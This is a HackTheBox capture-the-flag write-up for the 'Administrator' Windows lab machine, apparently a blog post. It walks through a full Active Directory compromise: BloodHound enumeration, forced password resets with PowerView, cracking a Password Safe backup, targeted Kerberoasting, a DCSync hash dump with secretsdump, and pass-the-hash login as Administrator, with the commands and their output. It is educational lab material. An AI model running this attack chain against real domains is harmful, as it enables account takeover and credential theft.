@@ -1,0 +1,310 @@
+---
+title: "HTB: Administrator"
+date: 2024-12-16
+description: "Administrator is a Windows Machine which consist of lateral movement through credential change and LSASS Dump."
+keywords: ["HTB", "HackTheBox", "Administrator", "Administrator HTB", "Administrator.HTB"]
+draft: false
+---
+
+## Road To User Flag
+
+Let's start off by running nmap scan on our target.
+
+```bash
+kali@kali:~/HTB/Machines/Administrator$ nmap -sV -sC --min-rate 10000 -o nmap.result 10.129.110.28
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-16 03:54 EST
+Nmap scan report for 10.129.110.28
+Host is up (0.039s latency).
+Not shown: 988 closed tcp ports (reset)
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-16 15:55:12Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-12-16T15:55:20
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: 7h00m15s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.41 seconds
+```
+
+There are not any special ports open within our target. The only interesting output is `administrator.htb` and we can add that into our `/etc/hosts` file.
+
+```bash
+kali@kali:~/HTB/Machines/Administrator$ cat /etc/hosts                                                           
+127.0.0.1       localhost
+127.0.1.1       kali
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters
+10.129.217.236  administrator.htb
+```
+
+Let's login as `olivia` with the credentials from HackTheBox using `evil-winrm`.
+
+```bash
+kali@kali:~/HTB/Machines/Administrator$ evil-winrm -i administrator.htb -u olivia -p ichliebedich
+....  
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\olivia\Documents> whoami
+administrator\olivia
+*Evil-WinRM* PS C:\Users\olivia\Documents> hostname
+dc
+```
+
+We successfully managed to login as `olivia`. Let's try getting a better view of our environment by collecting data for bloodhound.
+
+```bash
+kali@kali:~/HTB/Machines/Administrator/Bloodhound$ bloodhound-python -c All -u olivia -p ichliebedich -d administrator.htb -ns 10.129.219.82    
+INFO: Found AD domain: administrator.htb
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.administrator.htb:88)] [Errno -2] Name or service not known
+INFO: Connecting to LDAP server: dc.administrator.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc.administrator.htb
+INFO: Found 11 users
+INFO: Found 53 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: dc.administrator.htb
+INFO: Done in 00M 10S
+```
+
+We managed to successfully collect all the necessary data for bloodhound. All that we need to do now is to drag these `JSON` files over to bloodhound.
+
+<img src="/assets/images/HTB-Administrator/HTB-Administrator-1.png" className="rounded-lg" />
+
+Apparently, Olivia has the privileges to change the credentials of the user Michael. Let's try changing Michael credentials using the following command:
+
+```bash
+*Evil-WinRM* PS C:\Users\olivia\Documents> net user michael 12345678 /domain
+The command completed successfully.
+```
+
+We successfully managed to change the credentials of Michael. I also managed to login as Michael without any issues occurring.
+
+```bash
+kali@kali:~/HTB/Machines/Administrator/Bloodhound$ evil-winrm -i administrator.htb -u michael -p 12345678                                
+...
+*Evil-WinRM* PS C:\Users\michael\Documents> 
+```
+
+Let's go back to bloodhound again and check if Michael has any privileges we can use to further elevate our privileges within the machine.
+
+<img src="/assets/images/HTB-Administrator/HTB-Administrator-2.png" className="rounded-lg" />
+
+Interesting Michael has the permission to `ForceChangePassword` for Benjamin. Let's try changing Benjamin password using the following commands:
+
+```bash
+*Evil-WinRM* PS C:\Users\michael\Documents> upload PowerView.ps1
+*Evil-WinRM* PS C:\Users\michael\Documents> Import-Module ./PowerView.ps1
+*Evil-WinRM* PS C:\Users\michael\Documents> $SecPassword = ConvertTo-SecureString '12345678' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\michael\Documents> $Cred = New-Object System.Management.Automation.PSCredential('administrator.htb\michael', $SecPassword)
+*Evil-WinRM* PS C:\Users\michael\Documents> $UserPassword = ConvertTo-SecureString '12345678' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\michael\Documents> Set-DomainUserPassword -Identity Benjamin -AccountPassword $UserPassword -Credential $Cred
+```
+
+We successfully changed the credentials of Benjamin. I tried to use `evil-winrm` to login as Benjamin but I failed and after trying for hours... I found out that we actually needed to use Benjamin credentials to access FTP service running on port 21.
+
+```bash
+kali@kali:~/HTB/Machines/Administrator$ ftp administrator.htb
+Connected to administrator.htb.
+220 Microsoft FTP Service
+Name (administrator.htb:kali): benjamin
+331 Password required
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> dir
+229 Entering Extended Passive Mode (|||55340|)
+125 Data connection already open; Transfer starting.
+10-05-24  08:13AM                  952 Backup.psafe3
+226 Transfer complete.
+ftp> mget * 
+mget Backup.psafe3 [anpqy?]? y
+229 Entering Extended Passive Mode (|||55342|)
+125 Data connection already open; Transfer starting.
+100% |******************************************************************************************************************************************************************************************************************|   952        4.55 KiB/s    00:00 ETA226 Transfer complete.
+WARNING! 3 bare linefeeds received in ASCII mode.
+File may not have transferred correctly.
+952 bytes received in 00:00 (4.55 KiB/s)
+```
+
+We successfully managed to login to FTP service as Benjamin and now we'll need to crack the password of `Backup.psafe3` file. Which is possible by using JohnTheRipper.
+
+```bash
+kali@kali:~/HTB/Machines/Administrator$ pwsafe2john Backup.psafe3 > Backup.psafe3.hash
+
+kali@kali:~/HTB/Machines/Administrator$ john --wordlist=/usr/share/wordlists/rockyou.txt Backup.psafe3.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (pwsafe, Password Safe [SHA256 128/128 AVX 4x])
+Cost 1 (iteration count) is 2048 for all loaded hashes
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+tekieromucho     (Backu)     
+1g 0:00:00:00 DONE (2024-12-16 09:35) 4.761g/s 29257p/s 29257c/s 29257C/s dangerous..july21
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+After cracking the password I successfully managed to obtain the credentials for Emily, Alexander, and Emma.
+
+<img src="/assets/images/HTB-Administrator/HTB-Administrator-3.png" className="rounded-lg" />
+
+However, the credentials that we are interested in is Emily as she has our user flag.
+
+```bash
+kali@kali:~/HTB/Machines/Administrator$ evil-winrm -i administrator.htb -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
+...
+*Evil-WinRM* PS C:\Users\emily\Documents> whoami
+administrator\emily
+*Evil-WinRM* PS C:\Users\emily\Documents> hostname
+dc
+*Evil-WinRM* PS C:\Users\emily\Documents> pwd
+
+Path
+----
+C:\Users\emily\Documents
+
+*Evil-WinRM* PS C:\Users\emily\Documents> cat C:\Users\emily\Desktop\user.txt
+[USER_FLAG]
+```
+
+## Road To Root Flag
+
+According to bloodhound; Emily has the `GenericWrite` privileges over Ethan. That means we can change the attributes for the user Ethan.
+
+<img src="/assets/images/HTB-Administrator/HTB-Administrator-4.png" className="rounded-lg" />
+
+To obtain Ethan credentials we can do a Kerberoast attack by assigning a value to the `servicePrincipalName` attribute. Which is possible with the following commands:
+
+```bash
+*Evil-WinRM* PS C:\Users\emily\Documents> upload PowerView.ps1
+*Evil-WinRM* PS C:\Users\emily\Documents> Import-Module ./PowerView.ps1
+*Evil-WinRM* PS C:\Users\emily\Documents> $SecPassword = ConvertTo-SecureString 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\emily\Documents> $Cred = New-Object 
+System.Management.Automation.PSCredential('administrator.htb\emily', $SecPassword)
+*Evil-WinRM* PS C:\Users\emily\Documents> Set-DomainObject -Credential $Cred -Identity ethan -SET @{serviceprincipalname='administrator.htb/ethan'}
+*Evil-WinRM* PS C:\Users\emily\Documents> Get-DomainSPNTicket -Credential $Cred administrator.htb/ethan | fl
+Warning: [Invoke-UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work.
+Warning: [Invoke-UserImpersonation] Executing LogonUser() with user: administrator.htb\emily
+
+
+SamAccountName       : UNKNOWN
+DistinguishedName    : UNKNOWN
+ServicePrincipalName : administrator.htb/ethan
+TicketByteHexStream  :
+Hash                 : $krb5tgs$23$*UNKNOWN$UNKNOWN$administrator.htb/ethan*$83953FBE2726D2FCC0217AE351B9DF79$71A4BDBB0839FF203FD19EFDFFE3CEE737487779F52B3EBA726C0466EF3E4DDC9B673DCFCD082F1583DFC34BB62872BEB651578211B7D9F5D6EEBFA30AC93B3073A9B00AEE139227E8C2AFCE3B91E120526FA274594412E563E304AEDA937A0E6F52954770B7CF0744960D7D1F1C28A8F3947B590C04EBF2594633A14AFBD8018C94DF356FA1A8BF1C731A6C218F60B453C3B0EB9A9E16E9F783286738F5B52AD9EAAD557C10F5EF47C2F7F9EDE4C792E025E016565BF98A1A74D68CEF68AA797CFACB1A4FEB80364903FB383F6DA3D024FCA0EB6E3D8E8595090915D0DFDEACC698B44EE0E44500B795D5B78C1D8B9D20F83F898DC87F3A5AAD32543B246565FB6F9FD503099B84D275416E53158DC1B1DC0B11E8E85FD2D91C74C11C1FDEC674E8A850F0822A85CE5286A85433F1EE94B61ED85C5C6446582DF6C08011949284B3913482C2CEA2FC1BF7C33515C94144ECCE4CE68A866655FF3B18437E15984FF65CF4D67FAAF5B00474B53C820B098194F6A82A6C8CA214E7882EB9D283189512D6103F82574C4E857000184CC6D275ED5D5A3D047C6368EFDCA49A72150919FB7CB0F122B4632262AB9E1B46A085C92653D542A6AEB9E447A815FF619D802EA7D029252CBA46ED99FB146215357DAD812561A99200370973A502C6972BD14A46632CC622A24E2BC7EB51413643DF87880857A7DF095FD53D3D759DF8DEF6621453C544856F122B1A24326DC6EAE63BB7AF6201BF3721324A28979201324A55471E7082E19CBF99AD4857505764D572961F485911246FD867C519DE3E1603FC61746BAE6A8D6C23B6AFEEB0268B65EF583631BCB9E1F1921E33733B0FB708F227F02EC8318272D7E4A9BD24C8F9FC62EEF3EE4A48AF5EE392FF49FCC5898B4DCF3F93BE40ABE8520B3A8A7BDD58942F0CD0EE012AFE4D6782578E1DBC29532C6D45687C193A303D00BC0A0C63F5242D76E9CA38686FB7A98B609549CDD3FC968C6703B14ADAFA883B8B4BAD98618E11709A3D792B3556C2FF71AC5ECA65FFCBECB9D3B792BDE4A3A953A66B8CE477391DC80F64F863CF0E06E77326DFB115416C76592769133934BDB0E3A17F5594413BF433899B15DFC7806376794C236A1BF495ED4D59079131CE7A36E93BF9182A2C5A962D8CF46C21B0FD1BC278CEC6D45466B8D54309696AD1454613D31F3D35880ECA98390B43F272040A8576CC37975B7099DF6C8E8EB9A9D4EB31504636E853EEC66075617A3BEF12FD0075DB5C4CC66F81F2FBD9CF4D46B485265EC91FD90EE07D0689F86BE7A493936E9F39FB6F92280AC594A1319C88D5491D728A4BE0C95779BC0BFE5B7949BE0AEE6C4CAD99992819A2C8DF425B1451D45DA02D1F1F825587619A3D3C01B0D097BE070E7CB7D9FA0A47E31FFDFBA5828A14988D3DC86FC0545747A6ADDAC03A296A00EAC5E77476B6689818BA10CE805A1D887F9058A5F2442F38B0BD5D5C8C1C82E6EF984D372543031745CF3016AEB3A3679C1C9843727F319B2B6209F2F8DF564FA3BC70BCDA914708421EE8B43E8CC9217695C73A2A031670F1C1017365F3A825D0334201D3462CE5C4D6CBF0C3939C63F5025D6289A9FAC3E45D75D5E9788FE12FEE03AC7C98FE19FA1CEACBADE380496548CD98C0F2225CDEEB68EDD22E2F3315C129E9B50D800B738EB4C50B0A78A4B31F10A42189DDE63C5F21
+
+Warning: [Invoke-RevertToSelf] Reverting token impersonation and closing LogonUser() token handle
+```
+
+We can crack the Kerberos hash by using Hashcat with the following commands:
+
+```bash
+kali@kali:~/HTB/Machines/Administrator$ hashcat -m 13100 -a 0 krb.hash /usr/share/wordlists/rockyou.txt
+...
+$krb5tgs$23$*UNKNOWN$UNKNOWN$administrator.htb/ethan*$83953fbe2726d2fcc0217ae351b9df79$71a4bdbb0839ff203fd19efdffe3cee737487779f52b3eba726c0466ef3e4ddc9b673dcfcd082f1583dfc34bb62872beb651578211b7d9f5d6eebfa30ac93b3073a9b00aee139227e8c2afce3b91e120526fa274594412e563e304aeda937a0e6f52954770b7cf0744960d7d1f1c28a8f3947b590c04ebf2594633a14afbd8018c94df356fa1a8bf1c731a6c218f60b453c3b0eb9a9e16e9f783286738f5b52ad9eaad557c10f5ef47c2f7f9ede4c792e025e016565bf98a1a74d68cef68aa797cfacb1a4feb80364903fb383f6da3d024fca0eb6e3d8e8595090915d0dfdeacc698b44ee0e44500b795d5b78c1d8b9d20f83f898dc87f3a5aad32543b246565fb6f9fd503099b84d275416e53158dc1b1dc0b11e8e85fd2d91c74c11c1fdec674e8a850f0822a85ce5286a85433f1ee94b61ed85c5c6446582df6c08011949284b3913482c2cea2fc1bf7c33515c94144ecce4ce68a866655ff3b18437e15984ff65cf4d67faaf5b00474b53c820b098194f6a82a6c8ca214e7882eb9d283189512d6103f82574c4e857000184cc6d275ed5d5a3d047c6368efdca49a72150919fb7cb0f122b4632262ab9e1b46a085c92653d542a6aeb9e447a815ff619d802ea7d029252cba46ed99fb146215357dad812561a99200370973a502c6972bd14a46632cc622a24e2bc7eb51413643df87880857a7df095fd53d3d759df8def6621453c544856f122b1a24326dc6eae63bb7af6201bf3721324a28979201324a55471e7082e19cbf99ad4857505764d572961f485911246fd867c519de3e1603fc61746bae6a8d6c23b6afeeb0268b65ef583631bcb9e1f1921e33733b0fb708f227f02ec8318272d7e4a9bd24c8f9fc62eef3ee4a48af5ee392ff49fcc5898b4dcf3f93be40abe8520b3a8a7bdd58942f0cd0ee012afe4d6782578e1dbc29532c6d45687c193a303d00bc0a0c63f5242d76e9ca38686fb7a98b609549cdd3fc968c6703b14adafa883b8b4bad98618e11709a3d792b3556c2ff71ac5eca65ffcbecb9d3b792bde4a3a953a66b8ce477391dc80f64f863cf0e06e77326dfb115416c76592769133934bdb0e3a17f5594413bf433899b15dfc7806376794c236a1bf495ed4d59079131ce7a36e93bf9182a2c5a962d8cf46c21b0fd1bc278cec6d45466b8d54309696ad1454613d31f3d35880eca98390b43f272040a8576cc37975b7099df6c8e8eb9a9d4eb31504636e853eec66075617a3bef12fd0075db5c4cc66f81f2fbd9cf4d46b485265ec91fd90ee07d0689f86be7a493936e9f39fb6f92280ac594a1319c88d5491d728a4be0c95779bc0bfe5b7949be0aee6c4cad99992819a2c8df425b1451d45da02d1f1f825587619a3d3c01b0d097be070e7cb7d9fa0a47e31ffdfba5828a14988d3dc86fc0545747a6addac03a296a00eac5e77476b6689818ba10ce805a1d887f9058a5f2442f38b0bd5d5c8c1c82e6ef984d372543031745cf3016aeb3a3679c1c9843727f319b2b6209f2f8df564fa3bc70bcda914708421ee8b43e8cc9217695c73a2a031670f1c1017365f3a825d0334201d3462ce5c4d6cbf0c3939c63f5025d6289a9fac3e45d75d5e9788fe12fee03ac7c98fe19fa1ceacbade380496548cd98c0f2225cdeeb68edd22e2f3315c129e9b50d800b738eb4c50b0a78a4b31f10a42189dde63c5f21:limpbizkit
+...
+```
+
+We successfully managed to obtain the credentials of Ethan. Unfortunately, we cannot use `evil-winrm` to login as Ethan. However, we are able to dump all the NTLM hashes by using secretsdump.
+
+```bash
+kali@kali:~/HTB/Machines/Administrator$ impacket-secretsdump administrator.htb/ethan:limpbizkit@administrator.htb    
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
+administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
+administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:259745cb123a52aa2e693aaacca2db52:::
+administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:259745cb123a52aa2e693aaacca2db52:::
+administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
+administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
+administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
+administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
+Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
+Administrator:des-cbc-md5:403286f7cdf18385
+krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
+krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
+krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
+administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
+administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
+administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
+administrator.htb\michael:aes256-cts-hmac-sha1-96:519b4c84ffe7a54ef275463aaee05feff17f7ab0a3626777009ca9b071077f7b
+administrator.htb\michael:aes128-cts-hmac-sha1-96:cf18258aebf243ab8eab4a6d6caec794
+administrator.htb\michael:des-cbc-md5:194f1623cdf11957
+administrator.htb\benjamin:aes256-cts-hmac-sha1-96:e110f75337181474608f51a5b22d8198d3fa56d68633b384b7136d4496c89337
+administrator.htb\benjamin:aes128-cts-hmac-sha1-96:aa2b24ac2fb879262faa4f6ca294f332
+administrator.htb\benjamin:des-cbc-md5:1a4f0bce2343cebf
+administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
+administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
+administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
+administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
+administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
+administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
+administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
+administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
+administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
+administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
+administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
+administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
+DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
+DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
+DC$:des-cbc-md5:f483547c4325492a
+[*] Cleaning up... 
+```
+
+I successfully managed to dump all the NTLM Hashes inside the machine. Now we can login as administrator using the NTLM hash for the administrator and read the root flag.
+
+```bash
+kali@kali:~/HTB/Machines/Administrator$ evil-winrm -i administrator.htb -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
+...       
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+administrator\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
+dc
+*Evil-WinRM* PS C:\Users\Administrator\Documents> pwd
+
+Path
+----
+C:\Users\Administrator\Documents
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cat C:\Users\Administrator\Desktop\root.txt
+[ROOT FLAG]
+```
+
+## Conclusion
+
+I always forget to run BloodHound on Windows machine and this machine taught me the importance of it as BloodHound can display the data in much friendly way and help us with understanding our Active Directory environment. I would recommend this machine for people who are interested in learning and improving their understanding about Active Directory and BloodHound.
